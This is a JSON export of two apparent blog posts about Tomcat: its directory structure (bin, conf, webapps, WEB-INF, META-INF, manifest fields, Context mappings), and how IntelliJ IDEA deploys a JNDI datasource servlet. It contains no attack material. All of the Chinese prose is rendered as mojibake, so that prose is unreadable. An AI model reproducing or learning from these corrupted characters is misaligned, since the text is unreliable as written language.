[{"content":"Tomcat åŸºæœ¬ä¿¡æ¯æš‚æ—¶ä¸ä½œè¿‡å¤šä»‹ç»äº†ï¼Œæœ¬æ–‡èšç„¦äºTomcatçš„ç›®å½•ç»“æ„ç†è§£\nç›®å½•ç»“æ„ä¸€è§ˆ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 Tomcat â”œâ”€â”€ bin â”‚Â â”œâ”€â”€ bootstrap.jar â”‚Â â”œâ”€â”€ catalina-tasks.xml â”‚Â â”œâ”€â”€ catalina.bat â”‚Â â”œâ”€â”€ service.bat â”‚Â â”œâ”€â”€ shutdown.bat â”‚Â â”œâ”€â”€ startup.bat â”‚Â â”œâ”€â”€ tomcat11.exe â”‚Â â”œâ”€â”€ tomcat11w.exe â”‚Â â”œâ”€â”€ version.sh |\tâ”œâ”€â”€ ......... | â”œâ”€â”€ conf\t# ç”¨æ¥å­˜æ”¾tomcatçš„ä¸€äº›é…ç½®æ–‡ä»¶ | â”œâ”€â”€ Catalina\t# Catalina ä¸ºä¸€ä¸ªç›®å½•ï¼Œå¯ä»¥è®¾ç½®é»˜è®¤åŠ è½½çš„é¡¹ç›®ï¼Œåˆå§‹çŠ¶æ€ä¸‹å¯èƒ½ä¸å­˜åœ¨ â”‚Â â”œâ”€â”€ catalina.properties â”‚Â â”œâ”€â”€ context.xml\t# context.xml å¯ä»¥ç”¨æ¥é…ç½®æ•°æ®æºä¹‹ç±»çš„ â”‚Â â”œâ”€â”€ logging.properties â”‚Â â”œâ”€â”€ server.xml\t# server.xml å¯ä»¥è®¾ç½®ç«¯å£å·ã€è®¾ç½®åŸŸåæˆ–IPã€é»˜è®¤åŠ è½½çš„é¡¹ç›®ã€è¯·æ±‚ç¼–ç  â”‚Â â”œâ”€â”€ tomcat-users.xml\t# tomcat-users.xml ç”¨æ¥é…ç½®ç®¡ç†tomcatçš„ç”¨æˆ·ä¸æƒé™ â”‚Â â”œâ”€â”€ tomcat-users.xsd â”‚Â â””â”€â”€ web.xml\t# web.xml å¯ä»¥è®¾ç½®tomcatæ”¯æŒçš„æ–‡ä»¶ç±»å‹ â”‚ â”œâ”€â”€ lib\t# libç›®å½•ä¸»è¦ç”¨æ¥å­˜æ”¾tomcatè¿è¡Œéœ€è¦åŠ è½½çš„jaråŒ…ï¼Œå»ºè®®åªæŠŠTomcatéœ€è¦çš„jaråŒ…æ”¾åˆ°è¿™ä¸ªç›®å½•ä¸‹ â”‚\t# ä¾‹å¦‚ï¼Œåƒè¿æ¥æ•°æ®åº“çš„jdbcçš„åŒ…(mysql-connector-java-8.0.16.jar)æˆ‘ä»¬å¯ä»¥åŠ å…¥åˆ°libç›®å½•ä¸­æ¥ â”‚Â â”œâ”€â”€ annotations-api.jar â”‚Â â”œâ”€â”€ catalina-storeconfig.jar â”‚Â â”œâ”€â”€ tomcat-i18n-es.jar â”‚Â â”œâ”€â”€ ....... | â”œâ”€â”€ logs\t# é¡¾åæ€ä¹‰ï¼Œä¸€äº›æ—¥å¿—çš„ä¿å­˜ç‚¹ | â”œâ”€â”€ src\t# å¹¶éè‡ªå¸¦ï¼Œç¬”è€…åŒæ—¶ä¸‹è½½äº†æºç zipåŒ…ï¼Œè‡ªè¡Œåˆ›å»ºçš„ç›®å½•ï¼Œæ”¾å…¥äº†æºç  â”‚Â â””â”€â”€ apache-tomcat-11.0.0-src.zip | â”œâ”€â”€ temp\t# tempç›®å½•ç”¨æˆ·å­˜æ”¾tomcatåœ¨è¿è¡Œè¿‡ç¨‹ä¸­äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶ã€‚ï¼ˆæ¸…ç©ºä¸ä¼šå¯¹tomcatè¿è¡Œå¸¦æ¥å½±å“ï¼‰ â”‚Â â””â”€â”€ safeToDelete.tmp | â”œâ”€â”€ webapps â”‚Â â”œâ”€â”€ ROOT â”‚Â â”œâ”€â”€ ........ # ç¨åé‡ç‚¹ä»‹ç» â”‚ â”œâ”€â”€ work\t# work ç›®å½•ç”¨æ¥å­˜æ”¾tomcatåœ¨è¿è¡Œæ—¶çš„ç¼–è¯‘åæ–‡ä»¶ï¼Œä¾‹å¦‚è¿è¡Œæ—¶ç”Ÿæˆçš„æ–‡ä»¶ï¼Œæœ€ç»ˆè¿è¡Œçš„æ–‡ä»¶éƒ½åœ¨è¿™é‡Œã€‚é€šè¿‡webappsä¸­çš„é¡¹ç›®ç”Ÿæˆçš„ï¼ |\t# å¯ä»¥æŠŠè¿™ä¸ªç›®å½•ä¸‹çš„å†…å®¹åˆ é™¤ï¼Œå†æ¬¡è¿è¡Œæ—¶ä¼šç”Ÿå†æ¬¡ç”Ÿæˆworkç›®å½•ã€‚ |\t# å½“å®¢æˆ·ç«¯ç”¨æˆ·è®¿é—®ä¸€ä¸ªJSPæ–‡ä»¶æ—¶ï¼ŒTomcatä¼šé€šè¿‡JSPç”ŸæˆJavaæ–‡ä»¶ï¼Œç„¶åå†ç¼–è¯‘Javaæ–‡ä»¶ç”Ÿæˆclassæ–‡ä»¶ |\t# ç”Ÿæˆçš„javaå’Œclassæ–‡ä»¶éƒ½ä¼šå­˜æ”¾åˆ°è¿™ä¸ªç›®å½•ä¸‹ã€‚ |\t# æ¸…ç©ºworkç›®å½•ï¼Œç„¶åé‡å¯tomcatï¼Œå¯ä»¥è¾¾åˆ°æ¸…é™¤ç¼“å­˜çš„ä½œç”¨ã€‚ |\t# å¯ä»¥æŠŠè¿™ä¸ªç›®å½•ä¸‹çš„å†…å®¹åˆ é™¤ï¼Œå†æ¬¡è¿è¡Œæ—¶ä¼šç”Ÿå†æ¬¡ç”Ÿæˆworkç›®å½• | â”œâ”€â”€ LICENSE\t# è®¸å¯è¯ â””â”€â”€ NOTICE\t# è¯´æ˜æ–‡ä»¶ å…¶ä»–æ²¡æœ‰åˆ—å‡ºçš„æ ¹ç›®å½•ä¸‹çš„æ™®é€šæ–‡ä»¶ä¸é‡è¦\nWebapps Tomcatçš„ç›®å½•ç»“æ„ä¸­ï¼Œæœ€å€¼å¾—å…³æ³¨çš„ç›®å½•è¿™ä¸ªæ˜¯å‘å¸ƒå’Œè®¿é—®ç›®å½•\nwebappsç›®å½•ç”¨æ¥å­˜æ”¾åº”ç”¨ç¨‹åºï¼Œå½“tomcatå¯åŠ¨æ—¶ä¼šå»åŠ è½½webappsç›®å½•ä¸‹çš„åº”ç”¨ç¨‹åºã€‚\nå¯ä»¥ä»¥æ–‡ä»¶å¤¹ã€waråŒ…ã€jaråŒ…çš„å½¢å¼å‘å¸ƒåº”ç”¨ã€‚\nä¹Ÿå¯ä»¥æŠŠåº”ç”¨ç¨‹åºæ”¾ç½®åœ¨ç£ç›˜çš„ä»»æ„ä½ç½®ï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­æ˜ å°„å¥½å°±è¡Œï¼Œå¦‚ä¸‹\nå…¶ä¸­åˆåˆ†ä¸ºROOTç›®å½•å’Œå…¶ä»–ç›®å½•\nROOT é»˜è®¤æƒ…å†µä¸‹ï¼Œæ²¡æœ‰è®¿é—®è·¯å¾„çš„è¯·æ±‚ï¼Œä¼šè¢«æ˜ å°„åˆ°ROOTç›®å½•ä¸­\nä¸¾ä¾‹ï¼šå¦‚æœè®¿é—®http://localhost:8080/çš„è¯ï¼Œå°±å›å»æŸ¥æ‰¾ROOTç›®å½•\nè¯æ˜ï¼š\n12133.txtå†…å®¹å¦‚ä¸‹\nè¿™æ—¶å€™ï¼Œå¦‚æœè®¿é—®http://127.0.0.1:8080/12133.txtï¼Œç»“æœå¦‚ä¸‹\nAppç›®å½• å…¶ä»–ç›®å½•ä¸€èˆ¬éµå¾ªä¸€ä¸ªæ ‡å‡†ç»“æ„ï¼Œæˆ‘ä»¬ç»Ÿç§°è¿™ç§ç›®å½•ä¸ºAppç›®å½•\nä¸‹å›¾ä¸­çš„å‰4ä¸ªç›®å½•éƒ½å¯ä»¥ç§°ä¸ºAppç›®å½•\nä¾‹å¦‚ï¼šè®¿é—®http://127.0.0.1:8080/examples/ï¼Œé‚£ä¹ˆé»˜è®¤è®¿é—®çš„æ˜¯http://127.0.0.1:8080/examples/index.html\næ•ˆæœå¦‚ä¸‹\nindex.htmlå†…å®¹å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;!DOCTYPE HTML\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Apache Tomcat Examples\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt; \u0026lt;h3\u0026gt;Apache Tomcat Examples\u0026lt;/H3\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;servlets\u0026#34;\u0026gt;Servlets examples\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;jsp\u0026#34;\u0026gt;JSP Examples\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;websocket/index.xhtml\u0026#34;\u0026gt;WebSocket Examples\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; å®Œå…¨å¯¹åº”äº†\nAppç›®å½•æ ‡å‡†ç»“æ„ Tomcat è‡ªå¸¦çš„ Appç›®å½•çš„ç›®å½•å†…å®¹å¦‚ä¸‹\n1 2 3 4 5 6 7 examples/ â”œâ”€â”€ META-INF â”œâ”€â”€ WEB-INF â”œâ”€â”€ index.html â”œâ”€â”€ jsp â”œâ”€â”€ servlets â””â”€â”€ websocket å…¶ä¸­ï¼ŒWEB-INFæ˜¯å¿…è¦çš„é‡è¦ç›®å½•ï¼Œä¸”å¿…é¡»æ˜¯è¿™ä¸ªåå­—ï¼\nWEB-INF WEB-INF ä¸€èˆ¬æ˜¯å—ä¿æŠ¤çš„èµ„æºç›®å½•ï¼Œæµè§ˆå™¨é€šè¿‡urlä¸å¯ä»¥ç›´æ¥è®¿é—®çš„ç›®å½•\n/WEB-INF/web.xml Webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚ å¿…è¦æ–‡ä»¶ï¼Œwebé¡¹ç›®çš„åŸºæœ¬é…ç½®æ–‡ä»¶ã€‚ï¼ˆè¾ƒæ–°çš„ç‰ˆæœ¬ä¸­å¯ä»¥æ²¡æœ‰è¯¥æ–‡ä»¶ï¼Œä½†æ˜¯å­¦ä¹ è¿‡ç¨‹ä¸­è¿˜æ˜¯éœ€è¦è¯¥æ–‡ä»¶ï¼‰ /WEB-INF/classes/ åŒ…å«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­ã€‚ webé¡¹ç›®ä¸­å¦‚æœæ²¡æœ‰æºç ï¼Œåˆ™è¯¥ç›®å½•ä¸ä¼šå‡ºç° /WEB-INF/lib/ å­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶ã€‚ webé¡¹ç›®è¦æ˜¯æ²¡æœ‰ä¾èµ–ä»»ä½•jarï¼Œåˆ™è¯¥ç›®å½•ä¸ä¼šå‡ºç° /WEB-INF/src/ æºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ª Java æ–‡ä»¶ã€‚ /WEB-INF/database.properties æ•°æ®åº“é…ç½®æ–‡ä»¶ /WEB-INF/tags/ å­˜æ”¾äº†è‡ªå®šä¹‰æ ‡ç­¾æ–‡ä»¶ è¯¥ç›®å½•å¹¶ä¸ä¸€å®šä¸º tagsï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„å–œå¥½å’Œä¹ æƒ¯ä¸ºè‡ªå·±çš„æ ‡ç­¾æ–‡ä»¶åº“å‘½åï¼Œå½“ä½¿ç”¨è‡ªå®šä¹‰çš„æ ‡ç­¾æ–‡ä»¶åº“åç§°æ—¶ï¼Œåœ¨ä½¿ç”¨æ ‡ç­¾æ–‡ä»¶æ—¶å°±å¿…é¡»å£°æ˜æ­£ç¡®çš„æ ‡ç­¾æ–‡ä»¶åº“è·¯å¾„ã€‚ä¾‹å¦‚ï¼šå½“è‡ªå®šä¹‰æ ‡ç­¾æ–‡ä»¶åº“åç§°ä¸º simpleTags æ—¶ï¼Œåœ¨ä½¿ç”¨ simpleTags ç›®å½•ä¸‹çš„æ ‡ç­¾æ–‡ä»¶æ—¶ï¼Œå°±å¿…é¡»åœ¨ jsp æ–‡ä»¶å¤´å£°æ˜ä¸ºï¼š\u0026lt;%@ taglibprefix=\u0026quot;tags\u0026quot; tagdir=\u0026quot;/WEB-INF/simpleTags\u0026quot; % \u0026gt; /WEB-INF/jsp/ jsp æ–‡ä»¶çš„å­˜æ”¾ä½ç½®ã€‚æ”¹ç›®å½•æ²¡æœ‰ç‰¹å®šçš„å£°æ˜ï¼ŒåŒæ ·ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„å–œå¥½ä¸ä¹ æƒ¯æ¥å‘½åã€‚æ­¤ç›®å½•ä¸»è¦å­˜æ”¾çš„æ˜¯ jsp 1.2 ä»¥ä¸‹ç‰ˆæœ¬çš„æ–‡ä»¶ï¼Œä¸ºåŒºåˆ† jsp 2.0 æ–‡ä»¶ï¼Œé€šå¸¸ä½¿ç”¨ jsp å‘½åï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥å‘½åä¸º jspOldEdition ã€‚ META-INF jaræ–‡ä»¶ å¼€å‘ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨java classæ–‡ä»¶æ¥è¿è¡Œç¨‹åºï¼Œä¸è¿‡è¿™æ ·ä¸å¤ªæ–¹ä¾¿ï¼Œæ‰€ä»¥å‡ºç°äº†jaræ–‡ä»¶æ¥æä¾›å‘å¸ƒå’Œè¿è¡Œï¼Œjaræ–‡ä»¶å®é™…ä¸Šæ˜¯classæ–‡ä»¶çš„zipå‹ç¼©å­˜æ¡£ï¼Œæœ‰å¾ˆå¤šå·¥å…·éƒ½å¯ä»¥æ“çºµè¿™ç§æ ¼å¼çš„æ–‡ä»¶ï¼Œ\nä½†æ˜¯jaræ–‡ä»¶æœ¬èº«å¹¶ä¸èƒ½è¡¨è¾¾åº”ç”¨ç¨‹åºçš„ä¾¿ç­¾ä¿¡æ¯ï¼Œäºæ˜¯å‡ºç°äº†META-INFç›®å½•\njaræ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªç‰¹å®šçš„ç›®å½•æ¥å­˜æ”¾æ ‡ç­¾ä¿¡æ¯ï¼šMETA-INFç›®å½•\nä¸ºäº†æä¾›å­˜æ¡£çš„ä¾¿ç­¾ä¿¡æ¯ï¼Œå‡ºç°äº†META-INF/Manifest.mfæ–‡ä»¶ï¼Œå®ƒåŒ…å«äº†jaræ–‡ä»¶çš„å†…å®¹æè¿°ï¼Œåœ¨åº”ç”¨ç¨‹åºè¿è¡Œæ—¶å‘JVMæä¾›åº”ç”¨ç¨‹åºçš„ä¿¡æ¯ã€‚\njaræ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªé»˜è®¤äº§ç”Ÿçš„META-INFç›®å½•å’Œå…¶ä¸­çš„manifest.mfæ–‡ä»¶\nä½¿ç”¨jarå‘½ä»¤å¯ä»¥ç›´æ¥äº§ç”ŸMETA-INFç›®å½•å’Œmanifest.mfæ–‡ä»¶\nManifest.mfæ–‡ä»¶ç¤ºä¾‹ï¼š\n1 2 3 4 Manifest-Version: 1.0 Created-By: IntelliJ IDEA Built-By: Dan Build-Jdk: Oracle OpenJDK 17.0.11 è§£æ\n1 2 3 4 5 6 7 Manifest-Versionï¼šç”Ÿæˆçš„manifest.mfæ–‡ä»¶çš„ç‰ˆæœ¬ Created-Byï¼šæ–‡ä»¶çš„ç”Ÿæˆè€…ï¼Œä¸€èˆ¬ç”±jarå‘½ä»¤è¡Œå·¥å…·ç”Ÿæˆï¼Œè¿™é‡Œæ˜¾ç¤ºçš„æ˜¯ï¼šIDEA Built-Byï¼šæ–‡ä»¶çš„åˆ›å»ºç”¨æˆ·å‘½åï¼Œåœ¨IDEAçš„é…ç½®æ–‡ä»¶ä¸­å¯ä»¥è®¾ç½® Bulid-Jdkï¼šæ‰€ä½¿ç”¨çš„JDKç¯å¢ƒ å…¶å®manifest.mfæ–‡ä»¶ä¸­çš„é…ç½®ä¿¡æ¯é™¤äº†ä¸Šé¢çš„å››ä¸ªä¹‹å¤–ï¼Œè¿˜æ˜¯æœ‰å¾ˆå¤šçš„ï¼Œä»¥ä¸‹æ˜¯å‡ ä¸ªå¸¸è§çš„å±æ€§ï¼š\nä¸€èˆ¬å±æ€§\nSignature-Vresionï¼šå®šä¹‰jaræ–‡ä»¶çš„ç­¾åç‰ˆæœ¬ Class-Pathï¼šå†…éƒ¨çš„ç±»æœç´¢è·¯å¾„ï¼Œæä¾›ç»™åº”ç”¨ç¨‹åºæˆ–è€…ç±»è£…è½½å™¨ åº”ç”¨ç¨‹åºçš„ç›¸å…³å±æ€§\nMain-Classï¼šå®šä¹‰jaræ–‡ä»¶çš„å…¥å£ç±»ï¼Œè¯¥ç±»å¿…é¡»å¯æ‰§è¡Œï¼ä¸€æ—¦å®šä¹‰äº†è¯¥å±æ€§å°±å¯ä»¥ä½¿ç”¨java -jar ç¨‹åºå.jaræ¥è¿è¡Œè¯¥jaræ–‡ä»¶ Manifest.mfæ–‡ä»¶æ ¼å¼è¦æ±‚\nmanifestæ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œéƒ½æ˜¯ keyï¼value å¯¹åº”çš„ï¼›\nå±æ€§åå¼€å¤´ï¼Œæ¥ç€æ˜¯ \u0026ldquo;:\u0026rdquo; ï¼Œç„¶åæ˜¯å±æ€§å€¼ï¼›\næ¯è¡Œæœ€å¤š72ä¸ªå­—ç¬¦ï¼Œå¦‚æœéœ€è¦å¢åŠ ï¼Œå¯ä»¥åœ¨ä¸‹ä¸€è¡Œç»­è¡Œï¼Œç»­è¡Œä»¥ç©ºæ ¼å¼€å¤´ï¼Œä»¥ç©ºæ ¼å¼€å¤´çš„è¡Œéƒ½ä¼šè¢«è§†ä¸ºå‰ä¸€è¡Œçš„ç»­è¡Œã€‚\nå…¶ä»–ä½ç½®æ–‡ä»¶æ˜ å°„ æ‰¾åˆ°conf/server.xmlæ–‡ä»¶ä¸­çš„ host æ ‡ç­¾ï¼Œåœ¨ host æ ‡ç­¾å†…å®šä¹‰å­æ ‡ç­¾Context\nContextæ ‡ç­¾å¿…é¡»å®šä¹‰ docBaseï¼ˆå®é™…æ–‡ä»¶æ‰€åœ¨æ–‡ä»¶å¤¹è·¯å¾„:ä¾‹F:\\testï¼‰å±æ€§ï¼Œpathï¼ˆè®¿é—®è™šæ‹Ÿè·¯å¾„:ä¾‹/filesï¼‰å±æ€§\nä¸¾ä¾‹\n1 2 3 4 5 6 \u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;webapps\u0026#34; unpackWARs=\u0026#34;true\u0026#34; autoDeploy=\u0026#34;true\u0026#34;\u0026gt; # ä¸‹åˆ—æ˜¯é‡ç‚¹ \u0026lt;Context docBase=\u0026#34;F:\\test\u0026#34; path=\u0026#34;/files\u0026#34;\u0026gt;\u0026lt;/Context\u0026gt; ..... \u0026lt;/Host\u0026gt; é…ç½®å¥½åï¼Œè®¿é—®è·¯å¾„ localhost:8080/files/css.txt å³å¯è®¿é—®åˆ°å®é™…è·¯å¾„ F:\\test\\css.txt æ–‡ä»¶\nconf\\Catalina è¿™ä¸ªç›®å½•ç”±ä¸Šå¯çŸ¥ï¼Œè¿™ä¸ªç›®å½•çš„é…ç½®æœ‰å…³äºé»˜è®¤åŠ è½½çš„é¡¹ç›®\nè€Œå¤§åé¼é¼çš„IDEAï¼Œå³æ˜¯é€šè¿‡æ§åˆ¶conf\\Catalina\\localhostä¸‹çš„*.xmlæ–‡ä»¶ï¼Œæ¥æ˜ å°„è®¾ç½®Tomcatä¸é¡¹ç›®outputç›®å½•ä¹‹é—´çš„å…³ç³»\nä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œå†…å®¹å…¶å®ä¸conf/server.xmlä¸­çš„é…ç½®å†…å®¹æ— äºŒï¼Œåªæ˜¯è¿™ä¸ªæ— éœ€è€ƒè™‘æ”¾å…¥åˆ°æŒ‡å®šä½ç½®\nè¡¥å……ï¼š\nxml æ–‡ä»¶å†…å®¹å«ä¹‰å¦‚ä¸‹ï¼š\npath è¡¨ç¤ºå·¥ç¨‹çš„è®¿é—®è·¯å¾„:/jndidemo_war_exploded\ndocBase è¡¨ç¤ºå®é™…çš„å·¥ç¨‹ç›®å½•åœ¨å“ªé‡Œï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦è®¿é—®jndidemo_war_explodedæ–‡ä»¶å¤¹åœ¨æˆ‘ä»¬ä¸»æœºä¸Šçš„å…¨è·¯å¾„\næ³¨æ„ï¼šè¿™ä¸ªåœ°æ–¹pathçš„å‚æ•°å³/jndidemo_war_explodedè¦ä¸é…ç½®æ–‡ä»¶åç§°ç›¸ä¸€è‡´ï¼Œå¯ä»¥çœ‹åˆ°é…ç½®æ–‡ä»¶ä¸ºjndidemo_war_exploded.xmlï¼Œå…¶æ–‡ä»¶åç§°ä¸pathçš„å‚æ•°å³/jndidemo_war_explodedç›¸ä¸€è‡´\nRef https://blog.csdn.net/m0_68988603/article/details/124285667\nhttps://blog.csdn.net/Helen_1997_1997/article/details/131935349\nhttps://blog.csdn.net/u011479200/article/details/108244382\nhttps://blog.csdn.net/qq_38449518/article/details/82414069\nhttps://blog.csdn.net/MrYushiwen/article/details/113383917\n","date":"2024-12-06T11:03:48+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241206110927949.png","permalink":"https://d4n-sec.github.io/p/tomcatdirstruct/","title":"Tomcatç›®å½•ç»“æ„å­¦ä¹ "},{"content":"å‰æƒ…æè¦ IDEA ä¸­ï¼Œä»…ç¼–å†™äº†ä¸€ä¸ª.javaæ–‡ä»¶å³å¯éƒ¨ç½²ä¸€ä¸ªæ¥å£ï¼Œæ€ä¹ˆåšåˆ°çš„ï¼Ÿ\nç¬”è€…ä½¿ç”¨Test.javaæºç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package jndi.example.study; import jakarta.servlet.ServletException; import jakarta.servlet.annotation.WebServlet; import jakarta.servlet.http.HttpServlet; import jakarta.servlet.http.HttpServletRequest; import jakarta.servlet.http.HttpServletResponse; import javax.naming.Context; import javax.naming.InitialContext; import javax.sql.DataSource; import java.io.IOException; import java.sql.Connection; import java.sql.ResultSet; import java.sql.Statement; @WebServlet(\u0026#34;/test\u0026#34;) public class Test extends HttpServlet { @Override protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { try { // è·å–JNDIä¸Šä¸‹æ–‡ Context ctx = new InitialContext(); // æŸ¥æ‰¾æ•°æ®æº Context envContext = (Context) ctx.lookup(\u0026#34;java:/comp/env\u0026#34;); DataSource ds = (DataSource) envContext.lookup(\u0026#34;jdbc/sec\u0026#34;); // è·å–è¿æ¥ Connection conn = ds.getConnection(); System.out.println(\u0026#34;[+] success!\u0026#34;); // æ‰§è¡ŒæŸ¥è¯¢ Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(\u0026#34;SELECT * FROM sec.user;\u0026#34;); // å¤„ç†ç»“æœé›† while (rs.next()) { System.out.println(rs.getString(\u0026#34;email\u0026#34;)); } // å…³é—­è¿æ¥ rs.close(); stmt.close(); conn.close(); } catch (Exception e) { e.printStackTrace(); } } } å¦‚ä½•å¯åŠ¨å‘å¸ƒåˆ°Webç«¯çš„ï¼Ÿåˆ†ä¸ºä¸¤æ–¹é¢ï¼Œæ‰€ä»¥å°†ä¼šæœ‰ä¸¤ç¯‡æ–‡ç« \næœ¬æ–‡èšç„¦äº IDEA å¯åŠ¨ Tomcat æ—¶åšäº†å“ªäº›äº‹å„¿ï¼Ÿ\nä¸‹ç¯‡æ–‡ç« èšç„¦äº Tomcat æºç ä¸­å¦‚ä½•è¯†åˆ«å¹¶åˆ†é…å¤„ç†ç±»\nå®Œæ•´æµç¨‹ IDEAä¸Tomcatçš„è”åŠ¨å…¶å®ç®—æ˜¯å¼€å‘å·¥å…·å’Œè¿è¡ŒæœåŠ¡çš„é…åˆï¼Œæ‰€ä»¥æ—¶é—´é€»è¾‘æ¥çœ‹ï¼Œåº”è¯¥æ˜¯å…ˆå¼€å‘ï¼Œåè¿è¡Œï¼Œå…ˆIDEAï¼ŒåTomcat\nåˆ›å»ºé¡¹ç›® IDEAå¼€å‘webä¸šåŠ¡ä»£ç  IDEAä¸Šé…ç½®Tomcat IDEAå°†å·¥ç¨‹æ„å»ºä¸ºä¸€ä¸ªå¯ä»¥å‘å¸ƒçš„appç›®å½•/waråŒ…/jaråŒ… ï¼ˆé¡¹ç›®çš„ä¾èµ–åŒ…æœ€å¥½æ”¾åœ¨app/WEB-INF/libä¸‹ï¼‰ IDEAå°†æ„å»ºå¥½çš„appéƒ¨ç½²åˆ°tomcatä¸­ï¼Œå¯åŠ¨å¹¶è¿è¡Œ IDEAå¯åŠ¨Tomcat æ„å»ºå¥½çš„é¡¹ç›®å¹¶ä¸ä¼šæ”¾åœ¨Tomcatå®‰è£…ç›®å½•çš„webappsä¸­\nä¸ºäº†é˜²æ­¢æ±¡æŸ“æœ¬åœ°å®‰è£…çš„Tomcatï¼Œæ”¾åœ¨äº†Tomcatç”Ÿæˆçš„å‰¯æœ¬ä¸­\nè¿™ä¸ªç›®å½•ä¸‹çš„ä¸œè¥¿å¦‚ä¸‹å›¾æ‰€ç¤º\nè¿™äº›æ˜¯ä¸€äº›å…³é”®çš„é…ç½®æ–‡ä»¶\nè¿™æ ·åœ¨è°ƒè¯•æ—¶ï¼Œæœ‰äº›æ˜ å°„éœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶çš„æ—¶å€™ï¼Œä¹Ÿä¸ä¼šæ±¡æŸ“æœ¬åœ°å®‰è£…çš„Tomcatè½¯ä»¶é…ç½®\nåŸç†æ€»ç»“\nIDEAéƒ¨ç½²å¹¶è¿è¡Œé¡¹ç›®çš„åŸç†ï¼š\nideaå¹¶æ²¡æœ‰ç›´æ¥è¿›å°†ç¼–è¯‘å¥½çš„é¡¹ç›®æ”¾å…¥tomcatçš„webappsä¸­\nideaæ ¹æ®å…³è”çš„tomcatï¼Œåˆ›å»ºäº†ä¸€ä¸ªtomcaté…ç½®æ–‡ä»¶çš„å‰¯æœ¬ï¼Œå°†é¡¹ç›®çš„ç”Ÿæˆç›®å½•å†…å®¹é€šè¿‡è¿™äº›é…ç½®æ–‡ä»¶è”ç³»èµ·æ¥\nideaçš„tomcaté…ç½®æ–‡ä»¶å‰¯æœ¬åœ¨C:\\Users\\Dan\\AppData\\Local\\JetBrains\\IntelliJIdea2024.2\\tomcat\\ä¸­\nideaçš„tomcatå‰¯æœ¬ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„tomcatï¼Œå‰¯æœ¬é‡Œåªæ˜¯å‡†å¤‡äº†å’Œå½“å‰é¡¹ç›®ç›¸å…³çš„é…ç½®æ–‡ä»¶è€Œå·²\nideaå¯åŠ¨tomcatæ—¶ï¼Œæ˜¯è®©æœ¬åœ°tomcatç¨‹åºæŒ‰ç…§tomcatå‰¯æœ¬é‡Œçš„é…ç½®æ–‡ä»¶è¿è¡Œ\nideaçš„tomcatå‰¯æœ¬éƒ¨ç½²é¡¹ç›®çš„æ¨¡å¼æ˜¯é€šè¿‡conf/Catalina/localhost/*.xmlé…ç½®æ–‡ä»¶çš„å½¢å¼å®ç°é¡¹ç›®éƒ¨ç½²çš„\nä¸‹å›¾æ˜¯IDEAçš„conf\\Catalina\\localhost\\jndidemo_war_exploded.xmlæ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°ä¸é¡¹ç›®è¾“å‡ºè·¯å¾„è”ç³»èµ·æ¥äº† 